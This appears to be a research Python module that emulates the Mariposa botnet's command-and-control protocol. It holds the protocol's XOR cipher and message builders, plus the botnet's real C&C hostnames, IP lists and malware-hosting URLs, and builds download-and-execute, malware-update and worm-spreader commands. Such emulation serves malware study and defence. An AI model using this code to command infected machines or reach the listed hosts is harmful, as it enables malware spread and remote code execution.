""" This module contains code that simulates the Mariposa bot-family command and control protocol.
    Security notice: All urls or ip addresses listed in this module may potentially be harmful.
    The author may not be held responsibility for any damage caused by using or visiting these urls or ip addresses.
    You have been warned!

"""

from __future__ import absolute_import
import struct
from enum import Enum
from six.moves import range

__author__ = 'Sascha Kopp'


class MariposaMessageType(Enum):
    """ Message opcodes that Mariposa uses.

    """
    COMMAND_RESPONSE = 0x01
    JOIN_SERVER_MESSAGE = 0x61
    JOIN_SERVER_ACKNOWLEDGEMENT = 0x40
    ACKNOWLEDGEMENT = 0x80


class MariposaCommandType(Enum):
    """ Command codes that are used for sending commands.

    """
    IP_ADDRESS = 0x12
    SYSTEM_INFORMATION = 0x12
    ASCII_STRING = 0x14
    DISCONNECT_CNC = 0x51
    CONNECT_BPR2_STRING = 0x62
    BINARY_ASCII_STRING = 0xD1
    UNKNOWN_BINARY_0XDA = 0xDA


class MariposaProtocol(object):
    """ Class for creating Messages for the Mariposa botnet command and control protocol.

    """
    MARIPOSA_PORT1 = 5906
    MARIPOSA_PORT2 = 5907
    MARIPOSA_PORT3 = 3431
    MARIPOSA_PORT4 = 3435
    MARIPOSA_PORT5 = 3437
    MARIPOSA_PORT6 = 3434
    MARIPOSA_PORT7 = 3433
    MARIPOSA_HOST1 = 'butterfly.BigMoney.biz'
    MARIPOSA_HOST2 = 'bfisback.sinip.es'
    MARIPOSA_HOST3 = 'qwertasdfg.sinip.es'
    MARIPOSA_HOST4 = 'lalundelau.sinip.es'
    MARIPOSA_HOST5 = 'bf2back.sinip.es'
    MARIPOSA_HOST6 = 'thejacksonfive.mobi'

    def __init__(self):
        pass

    @staticmethod
    def encrypt_decrypt_payload(seq_number, payload, length):
        """ This method uses the 2 byte alternating xor encryption used by the Mariposa botnet.

        :type seq_number: int
        :type length: int
        :type payload: bytearray
        :param seq_number: the sequence number
        :param payload: the payload to de-/encrypt
        :param length: the payload length
        """
        xlength = bytearray(struct.pack('B', length))
        # xnot = None
        xor = bytearray(struct.pack('H', seq_number))
        xalt = 0
        # initialization
        xnot = xlength[0] ^ 0xFF
        xor[0] = xnot ^ xor[0]
        xor[1] = xnot ^ xor[1]
        # doing xor decryption
        for i in range(0, xlength[0]):
            payload[i] = payload[i] ^ xor[xalt]
            xalt ^= 1
        return payload

    @staticmethod
    def generate_header(message_type, seq_number):
        """ Generates the message header for the Mariposa protocol.


        :rtype : bytearray
        :param message_type: this is a 1 byte message opcode
        :param seq_number: this is a 2 byte big-endian sequence number, conversion to big-endian is done by method
        :type seq_number: int
        :type message_type: MariposaMessageType.*
        """
        h = bytearray()
        op = struct.pack('B', message_type.value)
        seq = struct.pack('H', seq_number)
        h += op
        h += seq
        return h

    # used during the initialisation phase

    @staticmethod
    def generate_initial_connect_message(seq_num):
        """ This generates the initial 'bpr2' connection message.

        :rtype : bytearray
        :type seq_num: int
        :param seq_num: the sequence number
        :return: the complete message
        """
        header = MariposaProtocol.generate_header(MariposaMessageType.JOIN_SERVER_MESSAGE, seq_num)
        raw_data = [0x62, 0x70, 0x72, 0x32]
        return header + MariposaProtocol.encrypt_decrypt_payload(seq_num, bytearray(raw_data), len(raw_data))

    @staticmethod
    def generate_initial_join_server_ack_ip_address(seq_num, remote_ip):
        """ This generates the response to a connection request, answering with the remotes ip address.


        :rtype : bytearray
        :type seq_num: int
        :type remote_ip: str
        :param seq_num: the sequence number
        :param remote_ip: the hosts ip address that was used for the initial connection
        :return: the complete message
        """
        header = MariposaProtocol.generate_header(MariposaMessageType.JOIN_SERVER_ACKNOWLEDGEMENT, seq_num)
        raw_data = [0x12]
        ib = bytearray()
        for n in remote_ip.split('.'):
            ba = int(n) & 0xFF
            ib += struct.pack('B', ba)
        if len(ib) != 4:
            raise RuntimeError("remote_ip is not an ip address")
        compound_data = bytearray(raw_data) + ib
        return header + MariposaProtocol.encrypt_decrypt_payload(seq_num, compound_data, len(compound_data))

    @staticmethod
    def generate_initial_response_sys_info(seq_num):
        """ This generates the response to the join-server-acknowledgement.
            Note: the byte sequence was not deciphered and is provided as seen.

        :rtype : bytearray
        :type seq_num: int
        :param seq_num: the sequence number
        :return: the complete message
        """
        header = MariposaProtocol.generate_header(MariposaMessageType.COMMAND_RESPONSE, seq_num)
        raw_data = [0x12, 0x92, 0x6e, 0xc9, 0x09, 0x00, 0x55, 0x53, 0x41, 0x40, 0x46, 0x75, 0x7a, 0x7a, 0x00, 0x66,
                    0x75, 0x7a, 0x7a, 0x2d, 0x34, 0x33, 0x32, 0x61, 0x31, 0x64, 0x00]
        return header + MariposaProtocol.encrypt_decrypt_payload(seq_num, bytearray(raw_data), len(raw_data))

    @staticmethod
    def generate_initial_command_response(seq_num):
        """ Generates a command respond for finishing the initialisation phase from the bot-side.

        :rtype : bytearray
        :type seq_num: int
        :param seq_num: the sequence number
        :return: the complete message
        """
        header = MariposaProtocol.generate_header(MariposaMessageType.COMMAND_RESPONSE, seq_num)
        return header

    @staticmethod
    def generate_initial_acknowledgement(seq_num):
        """ Generates an acknowledgement for finishing the initialisation phase from cnc-side

        :rtype : bytearray
        :type seq_num: int
        :param seq_num: the sequence number
        :return: the complete message
        """
        header = MariposaProtocol.generate_header(MariposaMessageType.ACKNOWLEDGEMENT, seq_num)
        return header

    # used periodicaly all 4 minutes (2 phase)

    @staticmethod
    def generate_aliveness_announcement(seq_num):
        """ Generates a message which tells the cnc that the bot is alive.

        :rtype : bytearray
        :type seq_num: int
        :param seq_num: the sequence number
        :return: the complete message
        """
        header = MariposaProtocol.generate_header(MariposaMessageType.COMMAND_RESPONSE, seq_num)
        return header

    @staticmethod
    def generate_aliveness_acknowledgement(seq_num):
        """ Generates a message answering an aliveness announcement.

        :rtype : bytearray
        :type seq_num: int
        :param seq_num: the sequence number
        :return: the complete message
        """
        header = MariposaProtocol.generate_header(MariposaMessageType.ACKNOWLEDGEMENT, seq_num)
        return header

    # used during 3rd phase

    @staticmethod
    def generate_unknown_command_sequence_0xda(seq_num):
        # todo: sequence is currently unknown
        """ This is a placeholder for a special command sequence whiche use case is currently uhnknown.

        :rtype : bytearray
        :type seq_num: int
        :param seq_num: the sequence number
        :return: the complete message
        :raise NotImplementedError: will be raised because this method is not implemented
        """
        raise NotImplementedError()

    @staticmethod
    def generate_silence_channel_message(seq_num, channel_number):
        """ Generates a message that silences a channel.


        :type channel_number: str
        :rtype : bytearray
        :type seq_num: int
        :param seq_num: the sequence number
        :param channel_number: number of the channel
        :return: the complete message
        """
        header = MariposaProtocol.generate_header(MariposaMessageType.COMMAND_RESPONSE, seq_num)
        cmd_str = 's1 '
        cmd_code = [0x14]
        pl = bytearray(cmd_code) + bytearray(cmd_str) + bytearray(channel_number)
        epl = header + MariposaProtocol.encrypt_decrypt_payload(seq_num, pl, len(pl))
        return epl

    @staticmethod
    def generate_enable_google_message(seq_num,
                                       google_custom_search_info='&cse=cse-search-box&cx=partner-pub-7637779550249976:7e1r9k-l0v8'):
        """ Generates a message that enables the google module.

        :type google_custom_search_info: str
        :rtype : bytearray
        :type seq_num: int
        :param seq_num: the sequence number
        :return: the complete message
        :param google_custom_search_info: parameters for google custom search
        """
        header = MariposaProtocol.generate_header(MariposaMessageType.COMMAND_RESPONSE, seq_num)
        cmd_str = 'g1 '
        cmd_code = [0x14]
        pl = bytearray(cmd_code) + bytearray(cmd_str) + bytearray(google_custom_search_info)
        epl = header + MariposaProtocol.encrypt_decrypt_payload(seq_num, pl, len(pl))
        return epl

    @staticmethod
    def generate_disable_google_message(seq_num):
        """ Generates a message that disables the google module.

        :rtype : bytearray
        :type seq_num: int
        :param seq_num: the sequence number
        :return: the complete message
        """
        header = MariposaProtocol.generate_header(MariposaMessageType.COMMAND_RESPONSE, seq_num)
        cmd_str = 'g0'
        cmd_code = [0x14]
        pl = bytearray(cmd_code) + bytearray(cmd_str)
        epl = header + MariposaProtocol.encrypt_decrypt_payload(seq_num, pl, len(pl))
        return epl

    @staticmethod
    def generate_enable_messenger_message(seq_num, url='http://obamawebcam.com'):
        """ Generates a message that enables the msn spreader module.

        :type url: str
        :rtype : bytearray
        :type seq_num: int
        :param seq_num: the sequence number
        :param url: an url to spread via msn
        :return: the complete message
        """
        header = MariposaProtocol.generate_header(MariposaMessageType.COMMAND_RESPONSE, seq_num)
        cmd_str = 'm1 '
        cmd_code = [0x14]
        pl = bytearray(cmd_code) + bytearray(cmd_str) + bytearray(url)
        epl = header + MariposaProtocol.encrypt_decrypt_payload(seq_num, pl, len(pl))
        return epl

    @staticmethod
    def generate_disable_messenger_message(seq_num):
        """ Generates a message that disables the msn spreader module.

        :rtype : bytearray
        :type seq_num: int
        :param seq_num: the sequence number
        :return: the complete message
        """
        header = MariposaProtocol.generate_header(MariposaMessageType.COMMAND_RESPONSE, seq_num)
        cmd_str = 'm0'
        cmd_code = [0x14]
        pl = bytearray(cmd_code) + bytearray(cmd_str)
        epl = header + MariposaProtocol.encrypt_decrypt_payload(seq_num, pl, len(pl))
        return epl

    @staticmethod
    def generate_enable_usb_spreader_message(seq_num):
        """ Generates a message that enables the usb spreader module.

        :rtype : bytearray
        :type seq_num: int
        :param seq_num: the sequence number
        :return: the complete message
        """
        header = MariposaProtocol.generate_header(MariposaMessageType.COMMAND_RESPONSE, seq_num)
        cmd_str = 'u1'
        cmd_code = [0x14]
        pl = bytearray(cmd_code) + bytearray(cmd_str)
        epl = header + MariposaProtocol.encrypt_decrypt_payload(seq_num, pl, len(pl))
        return epl

    @staticmethod
    def generate_disable_usb_spreader_message(seq_num):
        """ Generates a message that disables the usb spreader module.

        :rtype : bytearray
        :type seq_num: int
        :param seq_num: the sequence number
        :return: the complete message
        """
        header = MariposaProtocol.generate_header(MariposaMessageType.COMMAND_RESPONSE, seq_num)
        cmd_str = 'u0'
        cmd_code = [0x14]
        pl = bytearray(cmd_code) + bytearray(cmd_str)
        epl = header + MariposaProtocol.encrypt_decrypt_payload(seq_num, pl, len(pl))
        return epl

    @staticmethod
    def generate_channel_ip_list_message(seq_num,
                                         channel_ip_list='208.53.183.52@72.52.5.77;93.90.22.117@200.6.27.16,69.25.160.201,190.66.6.15,200.32.80.132,200.16.50.60,190.66.6.26,200.31.206.83,72.52.5.77;'):
        """ Generates a message that propagates a list of ip address.
            Use case is currently unknown.
            None of the ip addresses went active.
            Only provided for completeness.

        :type channel_ip_list: str
        :rtype : bytearray
        :type seq_num: int
        :param seq_num: the sequence number
        :return: the complete message
        :param channel_ip_list: a list of ip addresses
        :return:
        """
        header = MariposaProtocol.generate_header(MariposaMessageType.COMMAND_RESPONSE, seq_num)
        cmd_str = 'ch1 '
        cmd_code = [0x14]
        pl = bytearray(cmd_code) + bytearray(cmd_str) + bytearray(channel_ip_list)
        epl = header + MariposaProtocol.encrypt_decrypt_payload(seq_num, pl, len(pl))
        return epl

    @staticmethod
    def generate_update_malware_message(seq_num, url='http://p6photographers.com/images/x'):
        """ Generates a message for updating the botnets malware.


        :type url: str
        :rtype : bytearray
        :type seq_num: int
        :param seq_num: the sequence number
        :return: the complete message
        :param url: an url that contains a new malware binary
        """
        header = MariposaProtocol.generate_header(MariposaMessageType.COMMAND_RESPONSE, seq_num)
        cmd_str = 'pillaestenuevoya '
        cmd_code = [0x14]
        pl = bytearray(cmd_code) + bytearray(cmd_str) + bytearray(url)
        epl = header + MariposaProtocol.encrypt_decrypt_payload(seq_num, pl, len(pl))
        return epl

    @staticmethod
    def generate_download_and_exec_message(seq_num, url='http://rapidshare.com/files/287303528/8'):
        """ Generates a message for downloading and executing a remote executable.


        :type url: str
        :rtype : bytearray
        :type seq_num: int
        :param seq_num: the sequence number
        :return: the complete message
        :param url: an url pointing at an executable for downloading and executing
        """
        header = MariposaProtocol.generate_header(MariposaMessageType.COMMAND_RESPONSE, seq_num)
        cmd_str = 'download '
        cmd_code = [0x14]
        pl = bytearray(cmd_code) + bytearray(cmd_str) + bytearray(url)
        epl = header + MariposaProtocol.encrypt_decrypt_payload(seq_num, pl, len(pl))
        return epl

    @staticmethod
    def generate_new_alternative_download_and_exec_message(seq_num, url='http://rapidshare.com/files/290223745/81'):
        """ Generates a message for downloading and executing a remote executable.
            This is the new command version changing 'download' to 'trinka'.

        :type url: str
        :rtype : bytearray
        :type seq_num: int
        :param seq_num: the sequence number
        :return: the complete message
        :param url: an url pointing at an executable for downloading and executing
        """
        header = MariposaProtocol.generate_header(MariposaMessageType.COMMAND_RESPONSE, seq_num)
        cmd_str = 'trinka '
        cmd_code = [0x14]
        pl = bytearray(cmd_code) + bytearray(cmd_str) + bytearray(url)
        epl = header + MariposaProtocol.encrypt_decrypt_payload(seq_num, pl, len(pl))
        return epl

    @staticmethod
    def generate_remove_bot_message(seq_num):
        """ Generates a message that removes the bot from a host.

        :rtype : bytearray
        :type seq_num: int
        :param seq_num: the sequence number
        :return: the complete message
        """
        header = MariposaProtocol.generate_header(MariposaMessageType.COMMAND_RESPONSE, seq_num)
        cmd_str = 'alinfiernoya'
        cmd_code = [0x14]
        pl = bytearray(cmd_code) + bytearray(cmd_str)
        epl = header + MariposaProtocol.encrypt_decrypt_payload(seq_num, pl, len(pl))
        return epl
